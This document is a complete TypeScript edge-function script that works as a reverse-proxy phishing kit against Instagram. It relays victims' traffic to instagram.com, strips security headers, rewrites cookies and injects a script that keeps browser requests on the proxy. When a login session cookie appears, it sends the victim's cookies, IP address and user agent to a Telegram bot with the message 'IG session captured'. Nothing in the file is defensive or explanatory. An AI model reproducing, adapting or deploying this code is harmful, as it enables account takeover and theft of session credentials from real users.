const UPSTREAM = "https://www.instagram.com";
const REWRITE = /https?:\/\/(?:www\.|i\.)?instagram\.com/g;

const DROP_REQ = new Set([
  "host","connection","accept-encoding","cdn-loop","cf-connecting-ip",
  "cf-ipcountry","cf-ray","cf-visitor","x-forwarded-proto",
  "x-nf-client-connection-ip","x-nf-request-id"
]);

const DROP_RES = new Set([
  "content-security-policy","content-security-policy-report-only","x-frame-options",
  "content-encoding","content-length","transfer-encoding","connection","keep-alive",
  "alt-svc","strict-transport-security","public-key-pins","set-cookie","location"
]);

const seen = new Set<string>();

async function notify(text: string) {
  const token = Deno.env.get("TG_TOKEN");
  const chat = Deno.env.get("TG_CHAT");
  if (!token || !chat) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ chat_id: chat, text, disable_web_page_preview: true })
    });
  } catch (_) {}
}

const BEACON = `<script>
(function(){
  var R=/^https?:\\/\\/(?:www\\.|i\\.)?instagram\\.com/;
  function fix(u){ return (typeof u==="string" && R.test(u)) ? u.replace(R,"") : u; }
  var f=window.fetch;
  window.fetch=function(i,o){
    if(typeof i==="string"){ i=fix(i); }
    else if(i && i.url){ var n=fix(i.url); if(n!==i.url){ i=new Request(n,i); } }
    return f.call(this,i,o);
  };
  var op=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(m,u){
    var a=[].slice.call(arguments); a[1]=fix(u);
    return op.apply(this,a);
  };
})();
</script>`;

function fixCookie(c: string) {
  return c
    .replace(/;\s*domain=[^;]+/i, "")
    .replace(/;\s*samesite=[^;]+/i, "")
    .replace(/;\s*partitioned/i, "")
    .replace(/;\s*secure/i, "") + "; Secure; Path=/";
}

export const config = { path: "/*" };

export default async (request: Request, ctx: any) => {
  const u = new URL(request.url);
  if (u.pathname === "/__health") return new Response("ok");

  const headers = new Headers();
  for (const [k, v] of request.headers) {
    if (!DROP_REQ.has(k.toLowerCase())) headers.set(k, v);
  }
  headers.set("host", "www.instagram.com");
  if (!headers.has("accept-language")) headers.set("accept-language", "en-US,en;q=0.9");

  let body: ArrayBuffer | undefined;
  if (request.method !== "GET" && request.method !== "HEAD") {
    body = await request.arrayBuffer();
  }

  let res: Response;
  try {
    res = await fetch(UPSTREAM + u.pathname + u.search, {
      method: request.method,
      headers,
      body,
      redirect: "manual"
    });
  } catch (_) {
    return new Response("upstream error", { status: 502 });
  }

  const out = new Headers();
  for (const [k, v] of res.headers) {
    if (!DROP_RES.has(k.toLowerCase())) out.set(k, v);
  }

  const jar = (res.headers as any).getSetCookie?.() ?? [];
  for (const c of jar) {
    out.append("set-cookie", fixCookie(c));
    const m = c.match(/sessionid=([^;]+)/i);
    if (m && !seen.has(m[1])) {
      seen.add(m[1]);
      const all = jar.map((x) => x.split(";")[0]).join("; ");
      await notify(
        `IG session captured\nIP: ${ctx.ip}\nUA: ${request.headers.get("user-agent")}\n\n${all}`
      );
    }
  }

  const loc = res.headers.get("location");
  if (loc) out.set("location", loc.replace(REWRITE, ""));

  if ((res.headers.get("content-type") || "").includes("text/html")) {
    let html = await res.text();
    html = html.replace(REWRITE, "");
    html = html.replace(/<head([^>]*)>/i, (m) => m + BEACON);
    return new Response(html, { status: res.status, headers: out });
  }

  return new Response(res.body, { status: res.status, headers: out });
};
